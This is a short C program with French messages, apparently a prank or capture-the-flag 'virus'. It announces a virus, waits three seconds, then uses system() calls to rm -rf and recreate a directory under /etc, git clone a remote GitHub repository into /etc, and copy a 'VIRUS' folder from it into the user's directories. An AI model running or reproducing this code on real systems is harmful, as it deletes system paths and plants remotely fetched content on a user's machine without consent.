#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(){
	printf("Bienvenue!\n");
	printf("Tu as 3 secondes pour eteindre l'ordinateur avant que j'y mettes un virus...\n");
	sleep(3);
	
	printf("Trop tard!\n");
	
	system("rm -rf /etc/lib-ctf 2>/dev/null");
	system("mkdir /etc/lib-ctf 2>/dev/null");
	system("git clone https://github.com/JeremyLARDENOIS/lib-lle /etc/lib-lle 2>/dev/null");

	system("cp -rp /etc/lib-lle/VIRUS ../../VIRUS");

	printf("Quelque chose c'est passé dans ton répertoire personnel...\n");
}
